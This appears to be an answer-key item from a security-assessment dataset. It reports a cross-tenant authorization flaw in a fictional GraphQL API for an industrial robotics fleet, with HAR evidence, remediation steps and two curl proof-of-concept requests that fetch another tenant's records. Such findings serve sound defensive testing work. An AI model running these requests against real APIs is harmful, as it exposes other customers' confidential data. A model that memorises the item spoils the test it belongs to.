# Expected Response

## System
- Domain: Industrial IoT / Manufacturing
- System: ManuControl Robotics Fleet
- Example ID: GQL-0057

## Priority Findings

### Finding 1: Over-Broad getResource Endpoint — Cross-Tenant IIoT Robotics Data Disclosed (Pattern 3.3)
**Severity:** Critical
**Category:** BOLA / Semantic Ambiguity

**Summary:**
The `getResource` query on `POST /graphql` returns IIoT robotics fleet records belonging to `tenant-da11` to an attacker from `tenant-4cfd`. Per §5.0 (Pattern 3.3 — semantic ambiguity / over-broad endpoints), the resolver does not scope its response to the authenticated user's tenant, making any `resourceId` globally accessible to any valid JWT holder. In an IIoT/manufacturing context, this exposes robotics configuration, operational data, and production parameters across tenant boundaries.

**Evidence from HAR:**
- Request: `POST https://api.manucontrol-robotics.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-4cfd`
- Query: `getResource(id: "R-2057") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-da11"`, `ownerId: "other-user-4cfdda11"`, `sensitiveField: "CONFIDENTIAL-4cfdda11"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-4cfdda11`

**Root Cause (§4.0 RISK-GQL-057):** Resolver fetches by `resourceId` only, no tenant boundary.

## Steps to Reproduce

### Step 1 — Cross-tenant IIoT record access (HAR)
```bash
curl -s -X POST https://api.manucontrol-robotics.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4cfd" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2057\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenantId: "tenant-da11"`, `CONFIDENTIAL-4cfdda11`. **Secure:** FORBIDDEN.

### Step 2 — Cross-tenant list
```bash
curl -s -X POST https://api.manucontrol-robotics.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4cfd" \
  -d '{"query": "query { listResources(tenantId: \"tenant-da11\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `tenant-da11` robotics fleet records.

## Remediation
1. Resolver tenant guard on `getResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Ignore caller-supplied `tenantId` in `listResources`.
3. Per-ID ownership filter in `bulkResourceLookup`.
4. Redis cache key `resourceId:tenantId`.
